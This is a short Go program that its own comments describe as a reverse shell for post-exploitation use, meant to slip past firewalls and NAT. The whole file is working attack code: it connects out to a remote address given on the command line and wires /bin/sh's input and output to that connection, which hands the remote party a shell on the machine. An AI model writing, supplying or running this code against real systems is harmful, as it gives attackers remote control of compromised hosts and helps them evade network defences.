//This program creates a reverse bind shell. Useful in a post-exploitation scenario
//to avoid firewalls. Rather than listening for incoming connections, the client dials out
//to a machine, avoid firewalls and NAT routing.
package main

import (
  "fmt"
  "log"
  "net"
  "os"
  "os/exec"
)

var shell = "/bin/sh"

func main(){

  if len(os.Args) < 2{
    fmt.Println("Usage: " + os.Args[0] + "<remoteAddress>")
    os.Exit(1)
  }
  remoteConn, err := net.Dial("tcp", os.Args[1])
  if err != nil{
    log.Fatal("Error connecting to remote host.")
  }
  log.Println("Connection established.")
  command := exec.Command(shell)
  command.Stdin = remoteConn
  command.Stdout = remoteConn
  command.Stderr = remoteConn
  command.Run()


}
